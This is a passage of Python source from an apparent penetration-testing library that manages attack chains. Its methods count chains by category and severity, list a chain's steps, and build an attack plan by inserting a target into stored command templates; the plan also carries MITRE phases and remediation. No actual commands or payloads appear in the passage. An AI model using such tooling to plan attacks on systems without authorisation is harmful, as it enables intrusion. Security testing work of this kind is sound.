            all_tags.extend(c.tags)
        top_tags = Counter(all_tags).most_common(15)
        total_steps = sum(len(c.steps) for c in self.chains.values())

        return {
            "total_chains": len(self.chains),
            "by_category": dict(by_category),
            "by_severity": dict(by_severity),
            "categories_count": len(by_category),
            "total_steps": total_steps,
            "average_steps": round(total_steps / len(self.chains), 1) if self.chains else 0,
            "top_tags": top_tags
        }

    def get_chain_steps(self, chain_id: str) -> Optional[List[Dict[str, Any]]]:
        """获取攻击链步骤"""
        chain = self.chains.get(chain_id)
        if not chain:
            return None
        return [s.to_dict() for s in chain.steps]

    def generate_attack_plan(self, chain_id: str, target: str) -> Dict[str, Any]:
        """根据攻击链生成针对特定目标的攻击计划"""
        chain = self.chains.get(chain_id)
        if not chain:
            return {"error": "攻击链不存在"}

        plan = {
            "chain_name": chain.name,
            "target": target,
            "category": chain.category,
            "severity": chain.severity,
            "estimated_time": chain.estimated_time,
            "prerequisites": chain.prerequisites,
            "steps": [],
            "mitre_phases": chain.mitre_phases,
            "remediation": chain.remediation
        }

        for step in chain.steps:
            plan_step = step.to_dict()
            plan_step["commands"] = [cmd.replace("{target}", target) for cmd in step.commands]
            plan["steps"].append(plan_step)

        return plan


# 全局实例
attack_chain_library = AttackChainLibrary()
